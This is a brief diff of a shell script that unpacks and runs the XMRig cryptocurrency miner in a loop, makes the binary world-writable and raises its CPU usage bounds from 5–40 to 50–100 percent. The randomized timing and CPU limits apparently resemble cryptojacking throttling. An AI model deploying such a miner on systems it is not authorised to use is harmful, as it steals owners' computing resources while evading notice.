@@ -7,8 +7,8 @@ tar -xvf xmrig
 cp xmrig-6.16.2/xmrig xmrig
 t_min=45
 t_max=120
-cpu_min=5
-cpu_max=40
+cpu_min=50
+cpu_max=100
 chmod 777 xmrig
 while true :
   do
